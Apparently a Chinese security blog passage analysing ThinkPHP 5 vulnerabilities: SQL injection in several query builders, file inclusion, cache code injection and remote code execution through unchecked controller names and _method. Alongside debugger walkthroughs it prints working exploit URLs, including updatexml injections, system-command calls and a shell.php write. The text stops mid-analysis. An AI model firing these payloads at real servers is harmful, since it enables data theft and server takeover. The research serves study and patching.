href="https://static.kancloud.cn/manual/thinkphp5/118003">https://static.kancloud.cn/manual/thinkphp5/118003</a></p><h3 id="5-0-15-ParseData方法注入"><a href="#5-0-15-ParseData方法注入" class="headerlink" title="5.0.15 ParseData方法注入"></a>5.0.15 ParseData方法注入</h3><p>影响版本： <strong>5.0.13&lt;&#x3D;ThinkPHP&lt;&#x3D;5.0.15</strong> 、 <strong>5.1.0&lt;&#x3D;ThinkPHP&lt;&#x3D;5.1.5</strong> </p><p>环境安装</p><pre><code>composer create-project --prefer-dist topthink/think=5.0.15 thinkphp5.0.15</code></pre><p>开启 application&#x2F;config.php 中的 app_debug 和 app_trace </p><p>控制器：</p><pre><code class="php"> public function index()    &#123;        $name = request()-&gt;get(&#39;name&#39;);        var_dump($name);//        $result = Db::table(&#39;test&#39;)-&gt;insert([&#39;name&#39; =&gt; $name,&#39;password&#39;=&gt;&#39;123456&#39;]);        $result = db(&#39;test&#39;)-&gt;insert([&#39;name&#39; =&gt; $name,&#39;password&#39;=&gt;&#39;123456&#39;]);        return dump($result);    &#125;</code></pre><p>5.0.15和5.0.16版本对比，发现其修改的 <strong>Builder.php</strong> 文件代码</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230704201241633.png" alt="image-20230704201241633"></p><p>调试分析：</p><p><code>name=ww</code> –&gt;<code>insert</code></p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230704201928517.png" alt="image-20230704201928517"></p><p>到这里发现另一个<code>insert</code>方法，这个是生成sql语句的地方，跟进去看看</p><pre><code>name=ww --&gt;insert--&gt;insert</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230704202201864.png" alt="image-20230704202201864"></p><p>在这发现了官方修改的函数<code>parseData</code>,跟进看看</p><pre><code>name=ww --&gt;insert--&gt;insert--&gt;parseData</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230704202757576.png" alt="image-20230704202757576"></p><p>发现没有进入到跟新的地方，直接往下生成预处理数据</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230704203014828.png" alt="image-20230704203014828"></p><p>要进入里面，需要满足<code>$val</code>是数组</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230704203405087.png" alt="image-20230704203405087"></p><p>可以发现，如果能够进入switch case，这里没有进行预处理，并且是直接拼接返回</p><p>尝试传入数组，name[0]&#x3D;aa,并且把</p><pre><code>$name = request()-&gt;get(&#39;name&#39;);</code></pre><p>修改为</p><pre><code>$name = request()-&gt;get(&#39;name/a&#39;);</code></pre><p>表示数据类型转换为数组</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230704203856291.png" alt="image-20230704203856291"></p><p>这里已经成功进入，按照跟新的地方，这里修改为</p><pre><code>name[0]=inc</code></pre><p>后面还有$val[1]和$val[2]</p><p>所以要添加够参数</p><pre><code>name[0]=inc&amp;&amp;name[1]=aaa&amp;&amp;name[2]=bbb</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230704204332433.png" alt="image-20230704204332433"></p><p>运行返回到第一个insert方法</p><p>发现已经拼接好的sql语句，往下就是获取参数绑定和执行了</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230704204531375.png" alt="image-20230704204531375"></p><p>执行报错了</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230704204759216.png" alt="image-20230704204759216"></p><pre><code>name[1]=aa改为name[1]=aa’</code></pre><p>出现sql语句报错</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230704204840371.png" alt="image-20230704204840371"></p><p>直接在name[1]进行注入</p><pre><code>http://127.0.0.1/index.php?name[0]=inc&amp;&amp;name[1]=updatexml(1,concat(0x7,database(),0x7e),1)&amp;name[2]=aaa</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230704205043250.png" alt="image-20230704205043250"></p><h3 id="5-1-6-paraArraryData方法注入"><a href="#5-1-6-paraArraryData方法注入" class="headerlink" title="5.1.6 paraArraryData方法注入"></a>5.1.6 paraArraryData方法注入</h3><p>影响版本： <strong>5.1.6&lt;&#x3D;ThinkPHP&lt;&#x3D;5.1.7</strong></p><p>下载环境</p><pre><code>composer create-project --prefer-dist topthink/think=5.1.6 thinkphp5.1.6</code></pre><p>开启 config&#x2F;app.php 中的 app_debug 和 app_trace </p><p>控制器</p><pre><code class="php">public function index()    &#123;        $password = request()-&gt;get(&#39;password&#39;);        db(&#39;test&#39;)-&gt;where([&#39;name&#39; =&gt; &#39;bb&#39;])-&gt;update([&#39;password&#39; =&gt; $password]);        return &#39;Update success&#39;;    &#125;</code></pre><p>和5.1.8版本对比，发现<code>parseArrayData</code>被删除</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230704212600933.png" alt="image-20230704212600933"></p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230704214735175.png" alt="image-20230704214735175"></p><p>很明显的看到上面的parseArrayData是存在直接拼接</p><p>传参数调试一下password&#x3D;123，直接在<code>parseData</code>进行断点调试，</p><pre><code>update()--&gt;update()--parseDate()</code></pre><p>不难发现，传入参数不是数组，不能进入switch case里面</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230704215003689.png" alt="image-20230704215003689"></p><p>所以修改传入的参数</p><pre><code>password[0]=1&amp;password[1]=2&amp;password[2]=3</code></pre><p>修改控制器为</p><pre><code class="php">public function index()    &#123;        $password = request()-&gt;get(&#39;password/a&#39;);        db(&#39;test&#39;)-&gt;where([&#39;name&#39; =&gt; &#39;bb&#39;])-&gt;update([&#39;password&#39; =&gt; $password]);        return &#39;Update success&#39;;    &#125;</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230704215334783.png" alt="image-20230704215334783"></p><p>成功进入parseArrayData,跟进</p><pre><code>update()--&gt;update()--parseDate()-parseArrayData()</code></pre><p>来到了<code>think/db/builder/Mysql.php</code>的Mysql类，因为这个类继承了Builder类</p><p>来到这里，发现<code>$type</code>必须为<code>point</code>才能进行后续的拼接</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230704215814024.png" alt="image-20230704215814024"></p><p>修改传参,因为后面存在第4位数组，所以加多一位</p><pre><code class="php">?password[0]=point&amp;password[1]=2&amp;password[2]=3&amp;password[3]=4</code></pre><p>拼接后得到结果</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230704220500238.png" alt="image-20230704220500238"></p><p>返回到</p><pre><code>update()--&gt;update()</code></pre><p>查看生成的sql语句</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230704220818501.png" alt="image-20230704220818501"></p><p>可以对password这部分内容进行构造注入</p><pre><code>http://127.0.0.1/index.php?password[0]=point&amp;password[1]=1&amp;password[2]=updatexml(1,concat(0x7,user(),0x7e),1)^&amp;password[3]=0</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230704221119912.png" alt="image-20230704221119912"></p><p>构造的sql语句为</p><pre><code>&quot;UPDATE `test`  SET `password` = updatexml(1,concat(0x7,user(),0x7e),1)^(&#39;0(1)&#39;)  WHERE  `name` = :where_AND_name  &quot;</code></pre><h3 id="5-1-6-parseWhereItem方法注入"><a href="#5-1-6-parseWhereItem方法注入" class="headerlink" title="5.1.6 parseWhereItem方法注入"></a>5.1.6 parseWhereItem方法注入</h3><p>影响版本： <strong>ThinkPHP5全版本</strong> </p><p>控制器</p><pre><code class="php">public function index()    &#123;        $username = request()-&gt;get(&#39;username&#39;);        $result = db(&#39;users&#39;)-&gt;where(&#39;username&#39;,$username)-&gt;select();        var_dump($result);        return &#39;select success&#39;;    &#125;</code></pre><p>传入参数调试</p><pre><code>username=admin</code></pre><p>先进入select(),前面是对参数进行一些分析和处理，里面再调用$this-&gt;connection-&gt;select()</p><pre><code>select()--&gt;connection.select()</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230705091038039.png" alt="image-20230705091038039"></p><p>跟进查看</p><p>找到生成sql语句的地方，在</p><pre><code>think\db\Builder-&gt;select()</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230705091228734.png" alt="image-20230705091228734"></p><p>跟进</p><pre><code>select()--&gt;connection.select()--&gt;Builder.select()</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230705091445089.png" alt="image-20230705091445089"></p><p>跟进这个 <strong>where</strong> 分析函数<code>parseWhere</code>，会发现其会调用生成查询条件 <strong>SQL</strong> 语句的 <strong>buildWhere</strong> 函数。</p><pre><code>select()--&gt;connection.select()--&gt;Builder.select()--&gt;parseWhere()</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230705091702418.png" alt="image-20230705091702418"></p><p>跟进</p><pre><code>select()--&gt;connection.select()--&gt;Builder.select()--&gt;parseWhere()--&gt;buildWhere()</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230705091957133.png" alt="image-20230705091957133"></p><p> 程序会运行到parseWhereItem where子单元分析函数，继续跟进查看</p><pre><code>select()--&gt;connection.select()--&gt;Builder.select()--&gt;parseWhere()--&gt;buildWhere()--&gt;parseWhereItem()</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230705094323968.png" alt="image-20230705094323968"></p><p>关键点就在这里，这里会根据不同的表达式进入不同的函数，</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230705094549091.png" alt="image-20230705094549091"></p><p>如果$exp&#x3D;EXP,那么就会进入<code>parseExp</code></p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230705094719384.png" alt="image-20230705094719384"></p><p>修改控制器</p><pre><code class="php">public function index()    &#123;        $username = request()-&gt;get(&#39;username&#39;);        $result = db(&#39;users&#39;)-&gt;where(&#39;username&#39;,&#39;exp&#39;,$username)-&gt;select();        return &#39;select success&#39;;    &#125;</code></pre><p>这里会出现直接拼接</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230705094831120.png" alt="image-20230705094831120"></p><p>返回的结果</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230705094903839.png" alt="image-20230705094903839"></p><p>层层返回，查看目前生成的sql</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230705095045212.png" alt="image-20230705095045212"></p><p>然后根据这个sql进行拼接</p><pre><code>http://127.0.0.1/?username=)%20union%20select%20updatexml(1%2cconcat(0x7e,database()%2c0x7e)%2c1)%23%20 </code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230705095305304.png" alt="image-20230705095305304"></p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230705095331293.png" alt="image-20230705095331293"></p><h3 id="5-1-22-parseOrder方法注入"><a href="#5-1-22-parseOrder方法注入" class="headerlink" title="5.1.22  parseOrder方法注入"></a><strong>5.1.22</strong>  parseOrder方法注入</h3><p>影响版本： <strong>5.1.16&lt;&#x3D;ThinkPHP5&lt;&#x3D;5.1.22</strong></p><pre><code>composer create-project --prefer-dist topthink/think=5.1.22 thinkphp-5.1.22</code></pre><p>控制器：</p><pre><code class="php">public function index()    &#123;        $orderby = request()-&gt;get(&#39;orderby&#39;);        $result = db(&#39;users&#39;)-&gt;where([&#39;username&#39; =&gt; &#39;admin&#39;])-&gt;order($orderby)-&gt;find();        var_dump($result);    &#125;</code></pre><p>官方修复：添加了<code>)</code>和<code>#</code>检查</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230705103055992.png" alt="image-20230705103055992"></p><p>调试，运行到解析函数parseOrder</p><pre><code>?orderby=id--&gt;select()</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230705111300943.png" alt="image-20230705111300943"></p><p>跟进</p><pre><code>?orderby=id--&gt;select()--&gt;parseOrder()</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230705111503580.png" alt="image-20230705111503580"></p><p>先判断<code>$order</code>是不是为空，就是传入的字符id</p><p>然后把它当数组，获取key和val</p><p>因为<code>key</code>是数字<code>0</code>,运行到<code>list(...)=...</code></p><p>大概是根据空格将字符串分开，变为数组</p><p>然后这里就是关键的地方</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230705112056553.png" alt="image-20230705112056553"></p><p>正常来说，<code>sort</code>获取的是order by的排序方式，先把它转为大写，再判断是否在数组里，再拼接</p><p>查看生成的sql语句</p><pre><code>SELECT * FROM `users` WHERE  `username` = :where_AND_username ORDER BY `id` LIMIT 1  </code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230705112813823.png" alt="image-20230705112813823"></p><p>因为没有过滤，可以尝试再id输入这里构造注入</p><pre><code>orderby=id`,updatexml(1,concat(0x7e,database(),0x7e),1)%23</code></pre><p>发现这里出现了问题</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230705113050691.png" alt="image-20230705113050691"></p><p>传入的值在当成数组使用时被分割，以逗号分隔开，最后拼接的只有id&#96;</p><p>如果把传入的值本身就是一个数组就能够解决这个问题</p><pre><code>?orderby[]=id`,updatexml(1,concat(0x7e,database(),0x7e),1)%23</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230705113417373.png" alt="image-20230705113417373"></p><p>最后拼接的结果</p><pre><code>SELECT * FROM `users` WHERE  `username` = :where_AND_username ORDER BY `id`,updatexml(1,concat(0x7e,database(),0x7e),1)#` LIMIT 1  </code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230705113500270.png" alt="image-20230705113500270"></p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230705113706760.png" alt="image-20230705113706760"></p><h3 id="5-0-10-cacheFile变量文件包含"><a href="#5-0-10-cacheFile变量文件包含" class="headerlink" title="5.0.10 cacheFile变量文件包含"></a>5.0.10 cacheFile变量文件包含</h3><p>控制器：</p><pre><code class="php">&lt;?phpnamespace app\index\controller;use think\Controller;class Index extends Controller&#123;    public function index()    &#123;        $this-&gt;assign(request()-&gt;get());        return $this-&gt;fetch(); // 当前模块/默认视图目录/当前控制器（小写）/当前操作（小写）.html    &#125;&#125;</code></pre><p>创建 <strong>application&#x2F;index&#x2F;view&#x2F;index&#x2F;index.html</strong> 文件，内容随意（没有这个模板文件的话，在渲染时程序会报错）</p><p>官方发布的更新：</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230705130446570.png" alt="image-20230705130446570"></p><p>查看这个文件的对应位置<code>template/driver/File.php</code></p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230705130632625.png" alt="image-20230705130632625"></p><p>发现这里可能会存在变量覆盖–&gt;extract(),<code>EXTR_OVERWRITE</code>模式是默认值，如果有冲突，则覆盖已有的变量</p><p>如果 <strong>$cacheFile</strong>可控，将导致文件包含漏洞出现</p><p>随便传入参数调试</p><p>调用栈：</p><pre><code>File.php:45, think\template\driver\File-&gt;read()Template.php:200, think\Template-&gt;fetch()Think.php:84, think\view\driver\Think-&gt;fetch()View.php:163, think\View-&gt;fetch()Controller.php:120, think\Controller-&gt;fetch()Index.php:31, app\index\controller\Index-&gt;index()App.php:343, ReflectionMethod-&gt;invokeArgs()App.php:343, think\App::invokeMethod()App.php:595, think\App::module()App.php:457, think\App::exec()App.php:139, think\App::run()start.php:19, require()index.php:17, &#123;main&#125;()</code></pre><p>到这个read（）函数</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230705132612535.png" alt="image-20230705132612535"></p><p>$var是传入的get参数，这里是数组</p><p>然后进入if,执行了extract()函数，使得这个数组变为: $a&#x3D;1</p><p>因为这里的$cacheFile前面控制不了，可以在这里进行变量覆盖修改它的值</p><p>传参数试试：</p><pre><code>?cacheFile=123</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230705133509895.png" alt="image-20230705133509895"></p><p>成功修改</p><p>在<strong>public</strong> 目录下写一个phpinfo.php试试，因为网站根目录是这</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230705133824031.png" alt="image-20230705133824031"></p><p>也可以使用绝对路径</p><h3 id="5-0-10-cache缓存函数远程代码执行"><a href="#5-0-10-cache缓存函数远程代码执行" class="headerlink" title="5.0.10 cache缓存函数远程代码执行"></a>5.0.10 cache缓存函数远程代码执行</h3><p>控制器：</p><pre><code class="php">&lt;?phpnamespace app\index\controller;use think\Cache;class Index&#123;    public function index()    &#123;       Cache::set(&quot;name&quot;,input(&quot;get.username&quot;));       return Cache::get(&#39;name&#39;);    &#125;&#125;</code></pre><p>官方修改：<br><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230705140742143.png" alt="image-20230705140742143"></p><p>可以看到官方为了不让用户构造的数据执行，在前面加上了exit();</p><p>本版本的代码如下</p><pre><code class="php">public function set($name, $value, $expire = null)    &#123;        if (is_null($expire)) &#123;            $expire = $this-&gt;options[&#39;expire&#39;];        &#125;        $filename = $this-&gt;getCacheKey($name);        if ($this-&gt;tag &amp;&amp; !is_file($filename)) &#123;            $first = true;        &#125;        $data = serialize($value);        if ($this-&gt;options[&#39;data_compress&#39;] &amp;&amp; function_exists(&#39;gzcompress&#39;)) &#123;            //数据压缩            $data = gzcompress($data, 3);        &#125;        $data   = &quot;&lt;?php\n//&quot; . sprintf(&#39;%012d&#39;, $expire) . $data . &quot;\n?&gt;&quot;;        $result = file_put_contents($filename, $data);        if ($result) &#123;            isset($first) &amp;&amp; $this-&gt;setTagItem($filename);            clearstatcache();            return true;        &#125; else &#123;            return false;        &#125;    &#125;</code></pre><p>直接在这下断点调试</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230705142607510.png" alt="image-20230705142607510"></p><p>红色方框处是获取文件名，和绝对路径</p><p>看一下，文件名生成规则：</p><pre><code class="php">protected function getCacheKey($name)    &#123;        $name = md5($name);        if ($this-&gt;options[&#39;cache_subdir&#39;]) &#123;            // 使用子目录            $name = substr($name, 0, 2) . DS . substr($name, 2);        &#125;        if ($this-&gt;options[&#39;prefix&#39;]) &#123;            $name = $this-&gt;options[&#39;prefix&#39;] . DS . $name;        &#125;        $filename = $this-&gt;options[&#39;path&#39;] . $name . &#39;.php&#39;;        $dir      = dirname($filename);        if (!is_dir($dir)) &#123;            mkdir($dir, 0755, true);        &#125;        return $filename;    &#125;</code></pre><p>然后再将传入的数据，即缓存数据进行序列化</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230705142924210.png" alt="image-20230705142924210"></p><p>这里的 <strong>$this-&gt;options[‘data_compress’]</strong> 变量默认情况下为 <strong>false</strong> ，所以数据不会经过 <strong>gzcompress</strong> 函数处理。</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230705143449734.png" alt="image-20230705143449734"></p><p>然后就是进行代码拼接，拼接的是序列化后的值，写入刚刚生成的php文件，虽然在序列化数据前面拼接了单行注释符 <strong>&#x2F;&#x2F;</strong> ，但是我们可以通过注入换行符绕过该限制。</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230705143101908.png" alt="image-20230705143101908"></p><p>所以构造poc, 其中%0d%0a是回车符和换行符 </p><pre><code>?username=123%0d%0aphpinfo();//</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230705144448553.png" alt="image-20230705144448553"></p><h3 id="远程代码执行（1）"><a href="#远程代码执行（1）" class="headerlink" title="远程代码执行（1）"></a>远程代码执行（1）</h3><p>该漏洞存在于 ThinkPHP 底层没有对控制器名进行很好的合法性校验，导致在未开启强制路由的情况下，用户可以调用任意类的任意方法，最终导致 远程代码执行漏洞 的产生</p><h4 id="5-0-7-lt-x3D-ThinkPHP5-lt-x3D-5-0-22"><a href="#5-0-7-lt-x3D-ThinkPHP5-lt-x3D-5-0-22" class="headerlink" title="5.0.7&lt;&#x3D;ThinkPHP5&lt;&#x3D;5.0.22"></a>5.0.7&lt;&#x3D;ThinkPHP5&lt;&#x3D;5.0.22</h4><p>测试环境5.0.10</p><p>5.0.23官方修复：添加了对控制器名的检查</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230705152558263.png" alt="image-20230705152558263"></p><p>在默认的情况下，可以使用路由兼容模式 <strong>s</strong> 参数，访问控制器内容</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230705153739024.png" alt="image-20230705153739024"></p><p>例如：</p><pre><code> http://site/?s=模块/控制器/方法/参数/参数值</code></pre><p>断点调试</p><pre><code>http://127.0.0.1/?s=index/index/index</code></pre><pre><code>run()</code></pre><p>在这个方法里调用了 routeCheck进行了路由检查 </p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230705163740925.png" alt="image-20230705163740925"></p><p>跟进</p><pre><code>run()--&gt;routeCheck()</code></pre><p>到了这里，这个方法对s传入的控制器&#x2F;方法&#x2F;参数进行解析</p><p>这里用了<code>/</code>对传入的字符串进行分割</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230705163934153.png" alt="image-20230705163934153"></p><p>分割后得到</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230705164451952.png" alt="image-20230705164451952"></p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230705164508469.png" alt="image-20230705164508469"></p><p>解析完这个后返回到run()</p><p>调用了exec()</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230705164623977.png" alt="image-20230705164623977"></p><p>跟进</p><pre><code>run()--&gt;exec()</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230705164738354.png" alt="image-20230705164738354"></p><p>继续跟进</p><pre><code>run()--&gt;exec()--&gt;module()</code></pre><p>这里可以看到官方修改的部分</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230705165150186.png" alt="image-20230705165150186"></p><p>这里是根据刚刚那个划分出来的数组进行分别处理，[1]为控制器，[2]为操作名</p><p>后面的就是调用这个控制器对应的操作</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230705165406310.png" alt="image-20230705165406310"></p><p>整个过程下来，没有对控制器名进行任何检查，可以调用任意控制器的任意方法（已经加载的类）</p><p>下面的是可以利用的</p><pre><code>?s=index/think\config/get&amp;name=database.username # 获取配置信息?s=index/\think\Lang/load&amp;file=../../test.jpg    # 包含任意文件?s=index/\think\Config/load&amp;file=../../t.php     # 包含任意.php文件?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=id  #执行系统命令</code></pre><h4 id="5-1-0-lt-x3D-ThinkPHP-lt-x3D-5-1-30"><a href="#5-1-0-lt-x3D-ThinkPHP-lt-x3D-5-1-30" class="headerlink" title="5.1.0&lt;&#x3D;ThinkPHP&lt;&#x3D;5.1.30"></a>5.1.0&lt;&#x3D;ThinkPHP&lt;&#x3D;5.1.30</h4><p>测试环境5.1.30</p><p>5.1.31官方修复：</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230705153155297.png" alt="image-20230705153155297"></p><p>这个版本的和上面5.0.x版本漏洞是差不多的,也是没有对控制器名进行检查</p><p>调试</p><pre><code>?s=index/index/index</code></pre><p>run()方法先进行初始化，然后调用<code>routeCheck()</code></p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230705184502066.png" alt="image-20230705184502066"></p><p>跟进</p><pre><code>run() --&gt; routeCheck()</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230705184732894.png" alt="image-20230705184732894"></p><p>在这里获取到s传来的参数，即 模块&#x2F;控制器&#x2F;方法</p><p>然后调用check(),对路由进行处理</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230705184934238.png" alt="image-20230705184934238"></p><p>跟进</p><pre><code>run() --&gt; routeCheck() --&gt;check()</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230705185130881.png" alt="image-20230705185130881"></p><p>在这里，路由的<code>/</code>被替换成’<code>| </code> ,即变成<code>index|index|index</code></p><p>来到<code>think/route/dispatch/Module.php</code></p><pre><code>run() --&gt; init() --&gt;init()</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230705185855493.png" alt="image-20230705185855493"></p><p>这里解析出控制器名和操作名</p><p>接下来就是实例化然后执行</p><pre><code>think\route\dispatch\Module-&gt;exec()</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230705190032330.png" alt="image-20230705190032330"></p><p>整个过程中没有对控制器名进行检查，从而导致该漏洞</p><p>可利用的控制器：</p><pre><code>?s=index/\think\Request/input&amp;filter[]=system&amp;data=pwd?s=index/\think\view\driver\Php/display&amp;content=&lt;?php phpinfo();?&gt;?s=index/\think\template\driver\file/write&amp;cacheFile=shell.php&amp;content=&lt;?php phpinfo();?&gt;?s=index/\think\Container/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=id?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=id</code></pre><h3 id="远程代码执行（2）"><a href="#远程代码执行（2）" class="headerlink" title="远程代码执行（2）"></a>远程代码执行（2）</h3><h4 id="5-0-0-lt-x3D-ThinkPHP5-lt-x3D-5-0-23-and-5-1-0-lt-x3D-ThinkPHP-lt-x3D-5-1-30"><a href="#5-0-0-lt-x3D-ThinkPHP5-lt-x3D-5-0-23-and-5-1-0-lt-x3D-ThinkPHP-lt-x3D-5-1-30" class="headerlink" title="5.0.0&lt;&#x3D;ThinkPHP5&lt;&#x3D;5.0.23 and 5.1.0&lt;&#x3D;ThinkPHP&lt;&#x3D;5.1.30"></a>5.0.0&lt;&#x3D;ThinkPHP5&lt;&#x3D;5.0.23 and 5.1.0&lt;&#x3D;ThinkPHP&lt;&#x3D;5.1.30</h4><p>5.0.23分析</p><p>5.0.23版本对比5.0.24，官方修改了Request类，添加了对请求方法的检查</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230705191618791.png" alt="image-20230705191618791"></p><p>可以很明显的看出 <code>$method</code> 来自可控的 <code>$_POST</code>数组，而且在获取之后没有进行任何检查，直接把它作为 <code>Request</code> 类的方法进行调用，同时，该方法传入的参数是可控数据 <code>$_POST</code>。也就相当于可以随意调用 <code>Request</code> 类的部分方法。</p><p>这个method()方法在解析路由的过程中调用</p><p>调用栈如下</p><pre><code class="tex">Request.php:507, think\Request-&gt;method()Route.php:848, think\Route::check()App.php:632, think\App::routeCheck()App.php:116, think\App::run()start.php:19, require()index.php:17, &#123;main&#125;()</code></pre><p>在method()方法中</p><pre><code class="php">public function method($method = false)    &#123;        if (true === $method) &#123;            // 获取原始请求类型            return $this-&gt;server(&#39;REQUEST_METHOD&#39;) ?: &#39;GET&#39;;        &#125; elseif (!$this-&gt;method) &#123;            if (isset($_POST[Config::get(&#39;var_method&#39;)])) &#123;                $this-&gt;method = strtoupper($_POST[Config::get(&#39;var_method&#39;)]);                $this-&gt;&#123;$this-&gt;method&#125;($_POST);            &#125; elseif (isset($_SERVER[&#39;HTTP_X_HTTP_METHOD_OVERRIDE&#39;])) &#123;                $this-&gt;method = strtoupper($_SERVER[&#39;HTTP_X_HTTP_METHOD_OVERRIDE&#39;]);            &#125; else &#123;                $this-&gt;method = $this-&gt;server(&#39;REQUEST_METHOD&#39;) ?: &#39;GET&#39;;            &#125;        &#125;        return $this-&gt;method;    &#125;</code></pre><p>关键点在</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230705195700446.png" alt="image-20230705195700446"></p><p><code>Config::get(&#39;var_method&#39;)</code>是获取配置文件中的<code>var_method</code>的值，</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230705200127564.png" alt="image-20230705200127564"></p><p>检查是否POST了参数<code>_method</code>,然后获取POST来的_method的值，转成大写，然后将这个值当成函数去执行，该函数的参数是<code>$_POST</code></p><p>也就是POST的所有数据</p><p>这里的下一个目标是，在这个类中找到一个可以利用的方法，而且是有参方法</p><p>这里找到的是<code>__construct</code></p><pre><code class="php">protected function __construct($options = [])    &#123;        foreach ($options as $name =&gt; $item) &#123;            if (property_exists($this, $name)) &#123;                $this-&gt;$name = $item;            &#125;        &#125;        if (is_null($this-&gt;filter)) &#123;            $this-&gt;filter = Config::get(&#39;default_filter&#39;);        &#125;        // 保存 php://input        $this-&gt;input = file_get_contents(&#39;php://input&#39;);    &#125;</code></pre><p>这段代码很关键</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230705202147580.png" alt="image-20230705202147580"></p><p>这里会检查<code>$this</code>对象或类是否具有<code>$name</code>属性,如果有，将给这个属性赋值为<code>$item</code>，这给后面利用带来许多操作空间</p><p>该类有许多属性,现在要利用哪个还不确定</p><pre><code class="php">protected $get                  protected static $instance;protected $post                 protected $method;protected $request              protected $domain;protected $route                protected $url;protected $put;                 protected $baseUrl;protected $session              protected $baseFile;protected $file                 protected $root;protected $cookie               protected $pathinfo;protected $server               protected $path;protected $header               protected $routeInfo protected $mimeType             protected $env;protected $content;             protected $dispatch protected $filter;              protected $module;protected static $hook          protected $controller;protected $bind                 protected $action;protected $input;               protected $langset;protected $cache;               protected $param   protected $isCheckCache;    </code></pre><p>如果框架在配置文件中开启了 <code>debug</code> 模式（ <code>&#39;app_debug&#39;=&gt; true</code> ），程序会调用<code>Request</code> 类的 <code>param</code> 方法。这个方法我们需要特别关注了，因为 <code>Request</code> 类中的 <code>param、route、get、post、put、delete、patch、request、session、server、env、cookie、input</code> 方法均调用了 <code>filterValue</code>  方法，而该方法中就存在可利用的 <code>call_user_func</code>函数。</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230705204938325.png" alt="image-20230705204938325"></p><p>跟进 <code>param</code> 方法。发现其调用 <code>method</code> 方法。其会调用 server方法</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230705213056585.png" alt="image-20230705213056585"></p><p>在 server 方法中把 $this-&gt;server传入了 input 方法 ,这个 $this-&gt;server的值，我们可以通过先前 Request类的 <code>__construct </code>方法来覆盖赋值</p><p>可控数据作为 $data 传入 input 